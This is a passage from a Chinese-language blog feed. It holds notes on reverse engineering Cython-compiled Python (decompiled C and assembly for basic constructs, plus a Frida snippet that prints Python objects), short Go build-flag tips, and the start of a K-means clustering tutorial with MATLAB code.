print</span><br>v1 = PyTuple_Pack(<span class="hljs-number">1LL</span>, v0);<br>v3 = PyObject_GetAttr(__pyx_b, __pyx_n_s_print);<br>PyObject_Call(v3, v2, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure><h2 id="test-numbers-分析"><a href="#test-numbers-分析" class="headerlink" title="test_numbers() 分析"></a>test_numbers() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_numbers</span>():</span><br>    x = <span class="hljs-number">123</span><br>    y = <span class="hljs-number">12.3</span><br>    z = <span class="hljs-number">0x112233445566778899AABBCCDD</span><br>    print(x, y, z)<br></code></pre></td></tr></table></figure><p>print 三个参数，构造元组。<br>decompiler 识别出来的数据结构有问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov     edi, 3          ; size<br>call    _PyTuple_New<br>mov     [rax+18h], r12  ; 123<br>mov     [rax+20h], r15  ; 12.3<br>mov     [rax+28h], r14  ; 0x112233445566778899AABBCCDD<br></code></pre></td></tr></table></figure><p>这段代码也可以看出 Tuple 构造方法</p><h2 id="test-if-分析"><a href="#test-if-分析" class="headerlink" title="test_if() 分析"></a>test_if() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_if</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">456</span>:<br>        print(<span class="hljs-string">&quot;x &gt; 456&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;x &lt;= 456&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">v2 = PyObject_RichCompare(a2, __pyx_int_456, <span class="hljs-number">4</span>);<br>v5 = PyObject_IsTrue(v2);<br><span class="hljs-keyword">if</span> ( v5 )<br>    <span class="hljs-keyword">goto</span> LABEL_8;<br><span class="hljs-keyword">goto</span> LABEL_13;<br><br>LABEL_8 =&gt; 输出  x  &gt; <span class="hljs-number">456</span><br>LABEL_13 =&gt; 输出 x &lt;= <span class="hljs-number">456</span><br></code></pre></td></tr></table></figure><h2 id="test-for-分析"><a href="#test-for-分析" class="headerlink" title="test_for() 分析"></a>test_for() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_for</span>():</span><br>    s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>        s = s + i<br>    print(s)<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3 = PyLong_FromLong(0<span class="hljs-class">LL);</span><br>v0 = __pyx_int_0;<br>v2 = 0<br>while ( 1 ) &#123;<br>v0 = PyNumber_Add(v0, v3);<br>++v2;<br><span class="hljs-built_in">if </span>( v2 &gt;= 101 )<br>       break;<br>   v3 = PyLong_FromLong(v2);<br>&#125;<br><span class="hljs-keyword">.</span>.... print 代码忽略 ......<br></code></pre></td></tr></table></figure><p>range(101) 直接翻译成等价最优形式了。</p><h2 id="test-string-分析"><a href="#test-string-分析" class="headerlink" title="test_string() 分析"></a>test_string() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_string</span>():</span><br>    x = <span class="hljs-string">&quot;I am str.&quot;</span><br>    y = <span class="hljs-built_in">len</span>(x)<br>    z = x[<span class="hljs-number">1</span>]<br>    w = x[<span class="hljs-number">2</span>:]<br>    print(x, y, z, w)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;am&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(<span class="hljs-string">&quot;yes&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;wrong&quot;</span>)<br></code></pre></td></tr></table></figure><p>下标访问  <code> z = x[1]</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = __pyx_kp_s_I_am_str;<br><br>item = (v4-&gt;sq_item)(v0, <span class="hljs-number">1LL</span>); <span class="hljs-comment">// sq_item 访问下标 PyObject* PySequence_GetItem(PyObject *o, Py_ssize_t i)</span><br>或者<br>v31 = PyLong_FromSsize_t(<span class="hljs-number">1LL</span>);<br>item = PyObject_GetItem(v0, v31);<br><br></code></pre></td></tr></table></figure><p>切片访问  w = x[2:]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = __pyx_kp_s_I_am_str;<br>__pyx_slice__2 = PySlice_New(__pyx_int_2, &amp;_Py_NoneStruct, &amp;_Py_NoneStruct);<br>v6 = (v0-&gt;ob_type-&gt;tp_as_mapping-&gt;mp_subscript)(v0, __pyx_slice__2);<br></code></pre></td></tr></table></figure><p><code>in</code> 关键字</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v10</span> = PySequence_Contains(v1, __pyx_n_s_am)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="test-list-分析"><a href="#test-list-分析" class="headerlink" title="test_list() 分析"></a>test_list() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_list</span>():</span><br>    x = <span class="hljs-built_in">list</span>()<br>    x.append(<span class="hljs-number">1</span>)<br>    x.append(<span class="hljs-number">2</span>)<br>    x.append(<span class="hljs-number">3</span>)<br>    x.append(<span class="hljs-number">4</span>)<br>    x.append(<span class="hljs-string">&quot;five&quot;</span>)<br>    print(x)<br>    print(<span class="hljs-built_in">len</span>(x))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>        print(i)<br>    x = x[<span class="hljs-number">1</span>:]<br>    x[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] = [<span class="hljs-number">22</span>, <span class="hljs-number">33</span>]<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs asm">v0 &#x3D; PyList_New(0LL);<br>PyList_Append(v1, __pyx_int_1);<br>PyList_Append(v1, __pyx_int_2);<br>......<br>PyList_Append(v1,  __pyx_n_s_five);<br><br>; for i in x: <br>;     print(i)<br>mov     rax, [rbx+18h]    &#x2F;&#x2F; 列表开始<br>mov     r15, [rax+r12*8]  &#x2F;&#x2F; r12 下标<br><br>; x &#x3D; x[1:]<br>call    _PyList_New<br>mov     rcx, rax<br>mov     rax, [rbp+var_38] ; var_38 是原来的 x<br>mov     r12, [rax+18h] ; 第一个 PyObect * 地址<br>lea     rsi, [r12+8] ; [1:] 跳过一个元素<br>mov     rdi, [rcx+18h]  ; __dst<br>lea     r15, [r13-1]<br>lea     rdx, ds:0[r15*8] ; __n r15 复制的元素的个数<br>call    _memcpy<br><br>;x[2:4] &#x3D; [22, 33]<br>;构造 [22, 33]<br>mov     edi, 2<br>call    _PyList_New<br>mov     r13, rax<br>mov     rax, cs:___pyx_int_22<br>mov     rcx, [r13+18h]<br>mov     [rcx], rax<br>mov     rax, cs:___pyx_int_33<br>mov     rcx, [r13+18h]<br>mov     [rcx+8], rax<br>mov     [rbp+var_40], rcx<br>; x[2:4] &#x3D; <br><br>;创建切片<br>mov     edi, 2          ; r12 &#x3D; _PyLong_FromSsize_t(2)<br>call    _PyLong_FromSsize_t<br>mov     r12, rax<br>mov     edi, 4          ; r15 &#x3D; _PyLong_FromSsize_t(4)<br>call    _PyLong_FromSsize_t<br>mov     r15, rax<br>mov     r13, cs:__Py_NoneStruct_ptr<br>mov     rdi, r12        ; start: 2<br>mov     rsi, rax        ; stop : 4<br>mov     rdx, r13        ; step __Py_NoneStruct_ptr<br>call    _PySlice_New<br>mov     [rbp+var_48], rax<br><br>;给切片赋值<br>mov r12, [rbp+var_48]<br>mov     rdi, rbx   ;o<br>mov     rsi, r12   ;key, 切片<br>mov     rdx, [rbp+var_38] ;v<br>mov     rax, [rbp+var_40]<br>call    qword ptr [rax+10h] ;mp_ass_subscript int PyObject_SetItem(PyObject *o, PyObject *key, PyObject *v)<br><br><br><br></code></pre></td></tr></table></figure><h2 id="test-dict-分析"><a href="#test-dict-分析" class="headerlink" title="test_dict() 分析"></a>test_dict() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_dict</span>():</span><br>    x = &#123;&#125;<br>    x[<span class="hljs-string">&quot;one&quot;</span>] = <span class="hljs-number">1</span><br>    x[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br>    x[<span class="hljs-string">&quot;three&quot;</span>] = <span class="hljs-number">3</span><br>    y = x[<span class="hljs-string">&quot;one&quot;</span>]<br>    z = x[<span class="hljs-string">&quot;two&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;one&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(y)<br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> x:<br>        print(k, x[k])<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs asm">; x &#x3D; &#123;&#125;<br>call    _PyDict_New<br>mov rbx, rax ; rbx &#x3D;&gt; x PyObject *<br><br>;  x[&quot;one&quot;] &#x3D; 1<br>mov     rsi, cs:___pyx_n_s_one ; key<br>mov     rdx, cs:___pyx_int_1 ; v<br>mov     rdi, rbx        ; o<br>call    _PyDict_SetItem ;int PyObject_SetItem(PyObject *o, PyObject *key, PyObject *v)<br><br>; x[&quot;two&quot;] &#x3D; 2<br>mov     rsi, cs:___pyx_n_s_two ; key<br>mov     rdx, cs:___pyx_int_2 ; item<br>mov     rdi, rbx        ; mp<br>call    _PyDict_SetItem<br><br>; x[&quot;three&quot;] &#x3D; 3<br>mov     rsi, cs:___pyx_n_s_three ; key<br>mov     rdx, cs:___pyx_int_3 ; item<br>mov     rdi, rbx        ; mp<br>call    _PyDict_SetItem<br><br>;  y &#x3D; x[&quot;one&quot;]<br>mov     rsi, cs:___pyx_n_s_one<br>mov     rdi, rbx<br>call    ___Pyx_PyDict_GetItem<br>mov     [rbp+var_40], rax<br><br>;  z &#x3D; x[&quot;two&quot;]<br>mov     rsi, cs:___pyx_n_s_two<br>mov     rdi, rbx<br>call    ___Pyx_PyDict_GetItem<br>mov     [rbp+var_38], rax<br><br>; if &quot;one&quot; in x<br>mov     rsi, cs:___pyx_n_s_one ; key<br>mov     rdi, rbx        ; mp<br>call    _PyDict_Contains ; key in mp retrun 1, not in return 0, error: -1<br><br><br>; for k in x<br>loop_start:<br>mov     rdi, rbx        ; o<br>lea     rsi, [rbp+pos]  ; pos<br>lea     rdx, [rbp+key]  ; key<br>lea     rcx, [rbp+value] ; value<br>call    _PyDict_Next ; int PyDict_Next(PyObject *p, Py_ssize_t *ppos, PyObject **pkey, PyObject **pvalue)<br>.......<br>call    ___Pyx_PyDict_GetItem<br>.......<br>call    _PyTuple_New<br>.....<br>call    _PyTuple_Pack<br>....<br>call print.<br>.....<br>call    _PyDict_Size<br>......<br></code></pre></td></tr></table></figure><h2 id="test-datetime-分析"><a href="#test-datetime-分析" class="headerlink" title="test_datetime () 分析"></a>test_datetime () 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_datetime</span>():</span><br>    x = datetime.datetime.now()<br>    print(x)<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov     rbx, cs:___pyx_n_s_datetime<br>mov     rdx, [rbx+18h]<br>mov     rsi, rbx<br>call    __PyDict_GetItem_KnownHash<br>mov     r15, rax<br><br>mov     rsi, cs:___pyx_n_s_datetime<br>mov     rdi, r15        ; PyObject *<br>call    _PyObject_GetAttr<br>mov     rbx, rax<br><br>mov     rsi, cs:___pyx_n_s_now ;now<br>mov     rdi, rbx<br>call    _PyObject_GetAttr<br>mov     r15, rax<br><br>mov     rsi, cs:___pyx_empty_tuple<br>mov     rdi, r15        ; callable_object<br>call    ___Pyx_PyObject_Call<br><br>........ print(x) 略 ........<br></code></pre></td></tr></table></figure><h2 id="test-format-分析"><a href="#test-format-分析" class="headerlink" title="test_format() 分析"></a>test_format() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_format</span>():</span><br>    x = <span class="hljs-number">1</span><br>    y = <span class="hljs-string">&quot;One&quot;</span><br>    z = <span class="hljs-string">&quot;%s is %d&quot;</span> % (y, x)<br>    print(z)<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov     r14, cs:___pyx_n_s_One<br>mov     edi, 1          ; __int64<br>call    _PyLong_FromLong<br>mov     r15, rax ; r15 &#x3D; _PyLong_FromLong(1)<br>mov     edi, 2          ; size<br>call    _PyTuple_New<br>mov     rbx, rax<br>mov     [rax+18h], r14 ; &quot;One&quot;<br>mov     [rax+20h], r15 ; 1<br><br>mov     rdi, cs:___pyx_kp_s_s_is_d ; %s is %d<br>mov     rsi, rax                   ; Tuple(&quot;One&quot;, 1)<br>call    _PyUnicode_Format<br><br></code></pre></td></tr></table></figure><h2 id="dump-PyObject"><a href="#dump-PyObject" class="headerlink" title="dump PyObject *"></a>dump PyObject *</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00007FFBC501B615 mov     rcx, rbx<br>.text:00007FFBC501B618 call    python38_PyObject_Str          <br>.text:00007FFBC501B618                                       <br>.text:00007FFBC501B61D mov     rcx, rax<br>.text:00007FFBC501B620 call    python38_PyUnicode_AsUTF8<br></code></pre></td></tr></table></figure><p>这样就可以得到 PyObject * 的字符串 dump 信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// frida -pid xxx</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DumpPyObject</span>(<span class="hljs-params">address</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (Process.arch === <span class="hljs-string">&quot;x64&quot;</span>) &#123;<br>        <span class="hljs-keyword">var</span> native_address = <span class="hljs-keyword">new</span> NativePointer(address);<br>        <span class="hljs-keyword">var</span> <span class="hljs-built_in">module</span> = Process.findModuleByName(<span class="hljs-string">&quot;python38.dll&quot;</span>);<br>        <span class="hljs-keyword">var</span> PyObject_Str = <span class="hljs-keyword">new</span> NativeFunction(<span class="hljs-built_in">module</span>.findExportByName(<span class="hljs-string">&quot;PyObject_Str&quot;</span>), <span class="hljs-string">&quot;pointer&quot;</span>, [<span class="hljs-string">&quot;pointer&quot;</span>], <span class="hljs-string">&quot;win64&quot;</span>);<br>        <span class="hljs-keyword">var</span> PyUnicode_AsUTF8 = <span class="hljs-keyword">new</span> NativeFunction(<span class="hljs-built_in">module</span>.findExportByName(<span class="hljs-string">&quot;PyUnicode_AsUTF8&quot;</span>), <span class="hljs-string">&quot;pointer&quot;</span>, [<span class="hljs-string">&quot;pointer&quot;</span>], <span class="hljs-string">&quot;win64&quot;</span>);<br>        <span class="hljs-keyword">var</span> obj = PyObject_Str(native_address);<br>        <span class="hljs-keyword">var</span> p = PyUnicode_AsUTF8(obj);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;okkk..&quot;</span>);<br>        <span class="hljs-built_in">console</span>.log(p.readUtf8String());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>[1] “The Basics of Cython” <a href="https://cython.readthedocs.io/en/latest/src/tutorial/cython_tutorial.html">https://cython.readthedocs.io/en/latest/src/tutorial/cython_tutorial.html</a></p><p>[2] “Object Protocol” <a href="https://docs.python.org/3/c-api/object.html">https://docs.python.org/3/c-api/object.html</a></p><p>[3] “Type Objects” <a href="https://docs.python.org/3/c-api/typeobj.html#c.PySequenceMethods.sq_item">https://docs.python.org/3/c-api/typeobj.html#c.PySequenceMethods.sq_item</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Cython-Reverse-notes&quot;&gt;&lt;a href=&quot;#Cython-Reverse-notes&quot; class=&quot;headerlink&quot; title=&quot;Cython Reverse notes&quot;&gt;&lt;/a&gt;Cython Reverse notes&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="PL_Reverse" scheme="https://panda0s.top/categories/PL-Reverse/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="Python" scheme="https://panda0s.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>go notes</title>
    <link href="https://panda0s.top/2021/05/06/go-notes/"/>
    <id>https://panda0s.top/2021/05/06/go-notes/</id>
    <published>2021-05-06T08:26:05.000Z</published>
    <updated>2021-05-06T08:50:58.022Z</updated>
    
    <content type="html"><![CDATA[<h1 id="go-笔记"><a href="#go-笔记" class="headerlink" title="go 笔记"></a>go 笔记</h1><p>开一篇博客页面记录一下学习 go 过程中的一些小笔记, 遇到新的会继续更新</p><p>[TOC]</p><h2 id="1-编译时删除源码路径"><a href="#1-编译时删除源码路径" class="headerlink" title="1. 编译时删除源码路径"></a>1. 编译时删除源码路径</h2><img src="/2021/05/06/go-notes/image-20210506162809042.png" class="" title="image-20210506162809042"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span>.<span class="hljs-keyword">exe</span> build -trimpath<br>strip xxx<br></code></pre></td></tr></table></figure><h2 id="2-关闭编译优化"><a href="#2-关闭编译优化" class="headerlink" title="2. 关闭编译优化"></a>2. 关闭编译优化</h2><p>有时候想逆向一些语言特性的时候，最好关掉编译优化</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">-gcflags <span class="hljs-string">&quot;-N -l&quot;</span><br>比如: <span class="hljs-keyword">go</span> build -<span class="hljs-keyword">o</span> hw.<span class="hljs-keyword">exe</span> -gcflags <span class="hljs-string">&quot;-N -l&quot;</span> HelloWorld.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;go-笔记&quot;&gt;&lt;a href=&quot;#go-笔记&quot; class=&quot;headerlink&quot; title=&quot;go 笔记&quot;&gt;&lt;/a&gt;go 笔记&lt;/h1&gt;&lt;p&gt;开一篇博客页面记录一下学习 go 过程中的一些小笔记, 遇到新的会继续更新&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="develop" scheme="https://panda0s.top/categories/develop/"/>
    
    
    <category term="golang" scheme="https://panda0s.top/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>Cluster notes</title>
    <link href="https://panda0s.top/2021/04/23/Cluster-notes/"/>
    <id>https://panda0s.top/2021/04/23/Cluster-notes/</id>
    <published>2021-04-23T08:07:26.000Z</published>
    <updated>2021-04-23T08:58:51.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h1><p>简单记录一下聚类。</p><p>无监督学习：训练集没有标签，聚类就是一个典型的无监督学习应用。</p><img src="/2021/04/23/Cluster-notes/image-20210423162155480.png" class="" title="image-20210423162155480"><p>聚类算法可以把上图分类两个簇。</p><h2 id="K-Means-算法"><a href="#K-Means-算法" class="headerlink" title="K-Means 算法"></a>K-Means 算法</h2><p><strong>K-Means</strong> 是最普及的聚类算法，算法接受一个未标记的数据集，然后将数据聚类成不同的组。K-Means算法的思想很简单，对于给定的样本集，按照样本之间的距离大小，将样本集划分为K个簇。让簇内的点尽量紧密的连在一起，而让簇间的距离尽量的大。</p><p>例如我们想将数据分成 k 个分组，k-means 算法首先选择 k 个随机点，这 k 个随机点称为 <strong>聚类中心</strong>（<strong>cluster centroids</strong>）</p><p>每一个聚类中心相当于“分组”的中心，k-means 算法优化目标是最小化所有数据与聚类中心点距离的距离和。</p><p>K-means 算法是一个迭代算法，每一次迭代完成两件事情</p><ul><li>计算每个数据最近的聚类中心，即为聚类中心关联数据（优化目标1）</li><li>用聚类中心关联的数据点平均分布位置更新该聚类中心 （优化目标2）</li></ul><p>k-means 算法优化目标</p><h3 id="优化目标-1"><a href="#优化目标-1" class="headerlink" title="优化目标(1)"></a>优化目标(1)</h3><img src="/2021/04/23/Cluster-notes/image-20210423163657455.png" class="" title="image-20210423163657455"><p>$c^{(i)}$ 是第 i 个样本 $x^{(i)}$ 最近的聚类中心的下标,  $\mu_j$ 是第 j 个聚类中心的向量。</p><p>优化目标(1) 的目标是找一个 j 使得 $x^{(i)}$ 到该聚类中心 $\mu_j$ 的距离最短（换句话讲，就是找到离 $x^{(i)}$ 最近的聚类中心, 并将该聚类中心的下标对应的下标赋值给 $c^{(i)}$）</p><p>通俗点讲，为聚类中心关联数据向量</p><p>优化目标(1)的代码实现</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">idx</span> = <span class="hljs-title">findClosestCentroids</span><span class="hljs-params">(X, centroids)</span></span><br><span class="hljs-comment">%FINDCLOSESTCENTROIDS computes the centroid memberships for every example</span><br><span class="hljs-comment">%   idx = FINDCLOSESTCENTROIDS (X, centroids) returns the closest centroids</span><br><span class="hljs-comment">%   in idx for a dataset X where each row is a single example. idx = m x 1 </span><br><span class="hljs-comment">%   vector of centroid assignments (i.e. each entry in range [1..K])</span><br><span class="hljs-comment">%</span><br><br><span class="hljs-comment">% Set K</span><br>K = <span class="hljs-built_in">size</span>(centroids, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">% You need to return the following variables correctly.</span><br>idx = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(X,<span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>)<br>    a = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(centroids));<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:<span 